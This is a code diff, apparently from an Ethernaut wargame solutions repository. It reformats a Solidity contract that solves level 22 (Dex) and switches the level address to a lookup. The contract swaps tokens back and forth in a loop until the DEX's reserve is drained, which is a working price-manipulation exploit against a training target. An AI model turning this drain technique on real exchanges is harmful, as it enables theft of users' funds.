@@ -13,16 +13,13 @@ contract Solution {
         address outputToken = _dex.token2();
         address tmp;
 
-        IERC20(inputToken).transferFrom(
-            msg.sender, address(this), _dex.balanceOf(inputToken, msg.sender)
-        );
+        IERC20(inputToken).transferFrom(msg.sender, address(this), _dex.balanceOf(inputToken, msg.sender));
         uint256 outputTokenBalance = _dex.balanceOf(outputToken, address(_dex));
         uint256 inputAmount = _dex.balanceOf(inputToken, address(this));
         require(inputAmount > 0, "No input token balance");
         uint256 swapCount;
         while (inputAmount < 110) {
-            uint256 inputTokenForAllOutput =
-                _dex.balanceOf(inputToken, address(_dex));
+            uint256 inputTokenForAllOutput = _dex.balanceOf(inputToken, address(_dex));
             if (inputTokenForAllOutput < inputAmount) {
                 inputAmount = inputTokenForAllOutput;
             }
@@ -34,10 +31,7 @@ contract Solution {
             inputAmount = _dex.balanceOf(inputToken, address(this));
             ++swapCount;
         }
-        require(
-            _dex.balanceOf(inputToken, address(_dex)) == 0,
-            "Input token balance should be 0"
-        );
+        require(_dex.balanceOf(inputToken, address(_dex)) == 0, "Input token balance should be 0");
         IERC20(inputToken).transfer(msg.sender, inputAmount);
     }
 }
@@ -57,6 +51,6 @@ contract SolutionScript is EthernautScript {
     }
 
     function getLevelAddress() internal view override returns (address) {
-        return 0xC084FC117324D7C628dBC41F17CAcAaF4765f49e;
+        return _getContractAddress("22");
     }
 }
